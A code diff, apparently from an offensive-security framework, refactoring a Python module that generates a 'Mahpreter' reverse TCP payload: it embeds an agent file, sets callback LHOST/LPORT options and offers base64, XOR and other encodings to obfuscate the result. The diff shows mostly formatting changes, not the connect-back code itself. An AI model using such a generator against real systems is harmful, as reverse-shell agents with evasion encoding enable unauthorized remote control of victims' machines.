@@ -1,13 +1,16 @@
+import os
+from typing import Any
+
 from core.module import BaseModule
 from core.option import Option
-from typing import Dict, Any
-import os
+
 
 class Payload(BaseModule):
     """
     Python Mahpreter Reverse TCP Payload.
     Gelişmiş ajan özellikleri sunan reverse TCP payload'ı.
     """
+
     Name = "python/mahpreter/reverse_tcp"
     Description = "Gelişmiş Mahpreter ajanı (Reverse TCP)."
     Author = "Mahmut P."
@@ -18,19 +21,30 @@ class Payload(BaseModule):
         self.Options = {
             "LHOST": Option("LHOST", "127.0.0.1", True, "Bağlanılacak IP."),
             "LPORT": Option("LPORT", 4444, True, "Bağlanılacak Port."),
-            "ENCODE": Option("ENCODE", "None", False, "Payload'ı encode et (base64, xor, hex, rot13, unicode_escape veya zincir: base64,xor)"),
-            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: /tmp/payload.py).", completion_dir=".")
+            "ENCODE": Option(
+                "ENCODE",
+                "None",
+                False,
+                "Payload'ı encode et (base64, xor, hex, rot13, unicode_escape veya zincir: base64,xor)",
+            ),
+            "OUTPUT": Option(
+                "OUTPUT",
+                "",
+                False,
+                "Payload'ı dosyaya kaydet (örn: /tmp/payload.py).",
+                completion_dir=".",
+            ),
         }
 
     def generate(self) -> str:
         lhost = self.get_option_value("LHOST")
         lport = self.get_option_value("LPORT")
         encode_type = self.get_option_value("ENCODE")
-        
+
         # Agent kodunu dosyadan okuyup payload içine gömüyoruz
-        agent_path = os.path.join(os.path.dirname(__file__), 'agent.py')
+        agent_path = os.path.join(os.path.dirname(__file__), "agent.py")
         try:
-            with open(agent_path, 'r') as f:
+            with open(agent_path) as f:
                 agent_code = f.read()
         except FileNotFoundError:
             return "Error: agent.py not found!"
@@ -57,11 +71,12 @@ if __name__ == "__main__":
 """
         # Encoding Logic
         from core.encoders.manager import apply_encoding
+
         return apply_encoding(raw_payload.strip(), encode_type)
 
-    def run(self, options: Dict[str, Any]):
+    def run(self, options: dict[str, Any]):
         code = self.generate()
-        
+
         output_path = self.get_option_value("OUTPUT")
         if output_path:
             if not output_path.endswith(".py"):
